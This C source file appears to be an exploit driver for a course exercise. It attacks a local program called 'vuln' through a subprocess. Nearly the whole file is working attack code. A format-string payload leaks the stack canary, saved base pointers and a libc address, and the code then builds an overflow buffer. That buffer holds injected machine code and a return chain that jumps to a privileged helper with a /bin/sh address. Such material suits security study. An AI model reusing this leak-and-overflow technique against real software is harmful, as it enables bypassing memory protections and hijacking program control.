#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;


   uint64_t auth_bp =           0x7ffc3f37ce20; // rbp value in auth
   uint64_t auth_cred_loc =     0x7ffc3f37ce10; // loc of cred 
   uint64_t auth_db_loc =       0x7ffc3f37ce08; // loc of db (local var of auth)
   uint64_t auth_cred     =     0x7ffc3f37cce0; // value of cred (after alloca)

   uint64_t auth_bp_cred_loc_dist  = auth_cred_loc - auth_bp;
   uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;


   uint64_t main_bp =           0x7ffc3f37d6f0; // saved rbp value in mainloop
   uint64_t auth_main_bp_dist = auth_bp - main_bp;

   
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message

   put_str("e %268$p %257$p %256$p %255$p %253$p %269$p \n");
   send();
   uint64_t cur_main_bp, main_loop_pointer, main_loop_bp, main_loop_cannary, libc_pointer, ret_from_helper_to_main;
   get_formatted("%p%p%p%p%p%p", &cur_main_bp, &main_loop_pointer, &main_loop_bp, &main_loop_cannary, &libc_pointer, &ret_from_helper_to_main);
   fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
   fprintf(stderr, "driver: Extracted a return address in the main_loop main_loop_pointer=%lx\n", main_loop_pointer);
   fprintf(stderr, "driver: Extracted base pointer of main_loop main_loop_bp=%lx\n", main_loop_bp);
   fprintf(stderr, "driver: Extracted cannary of the main_loop main_loop_cannary=%lx\n", main_loop_cannary);
   fprintf(stderr, "driver: Extracted libc pointer libc_pointer=%lx\n", libc_pointer);

   // Now, compute the information for the current run using the probed values
   uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
   uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
   fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx\n", 
           cur_auth_bp, cur_auth_cred_loc);
	
	uint64_t ret_point_offset_in_vuln = 0x1dc0;
	// offset of helper in vuln
	uint64_t helper_offset = 0x2411;
	//offset of leaked pointer "libc_pointer" in the libc
	uint64_t libc_inst_offset = 0x259c1;
	
	uint64_t helper_from_ret_point_dist = helper_offset - ret_point_offset_in_vuln;
	uint64_t cur_addr_private_helper = main_loop_pointer + helper_from_ret_point_dist;
	fprintf(stderr, "driver: Extracted Current helper Address: %p\n", cur_addr_private_helper);
	
	uint64_t cur_libc_base_adr = libc_pointer - libc_inst_offset;
	fprintf(stderr, "driver: Libc \"text section\" base address: %p\n", cur_libc_base_adr);
	
	//we have a /bin/sh string in the Libc
	//********** I used ROPgadget tool to extract gadgets and /bin/sh string from libc https://github.com/JonathanSalwan/ROPgadget/
	// offset of /bin/sh[null] string in the libc
	uint64_t binsh_in_libc_offset = 0x1b75aa;
	//compute address of /bin/sh in the libc at runtime
	int64_t cur_binsh_adr = (cur_libc_base_adr + binsh_in_libc_offset) - 0x25000;
	
	//Helper function arguments
	uint32_t param1 = 0x12345670;
	uint64_t param2 = 0x123456789abcdef0;
	uint64_t deadbeef = 0xdeadbeefdeadbeef;
	
	/* Injected Code 
	nop
	nop
	pop %rcx		address of private_helper
	pop %rdi		first parameter 
	pop %rsi		second parameter
	pop %rdx		/bin/sh address in libc
	jmp *%rcx
	*/ 
	//Assemble using this service http://shell-storm.org/online/Online-Assembler-and-Disassembler/
	
	uint64_t injected_code = 0xE1FF5A5E5F599090; //injected code in reverse order
	
	//address of injected code in stack
	uint64_t injected_code_adr = cur_auth_cred_loc - (5 * sizeof(void*));
  
   // Now, send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");
   
   unsigned explsz = auth_db_cred_dist + 8 - 8 + (9 * sizeof(void*));
   void* *expl = (void**)malloc(explsz);

   memset((void*)expl, '\1', explsz);
   
   
   expl[(explsz/sizeof(void*))-1] = (void*)ret_from_helper_to_main; // return address to the main (after main_loop call) for normal exit.
   expl[(explsz/sizeof(void*))-2] = (void*)cur_binsh_adr;
   expl[(explsz/sizeof(void*))-3] = (void*)param2;
   expl[(explsz/sizeof(void*))-4] = (void*)param1;
   expl[(explsz/sizeof(void*))-5] = (void*)cur_addr_private_helper; // retun address to helper
   expl[(explsz/sizeof(void*))-6] = (void*)injected_code_adr;	// jump to Injected Code.
   expl[(explsz/sizeof(void*))-7] = (void*)main_loop_bp;
   expl[(explsz/sizeof(void*))-8] = (void*)main_loop_cannary;
   expl[(explsz/sizeof(void*))-9] = (void*)cur_auth_cred_loc;
   expl[(explsz/sizeof(void*))-10] = (void*)cur_auth_cred_loc;
   expl[(explsz/sizeof(void*))-14]= injected_code;
  
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");
   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
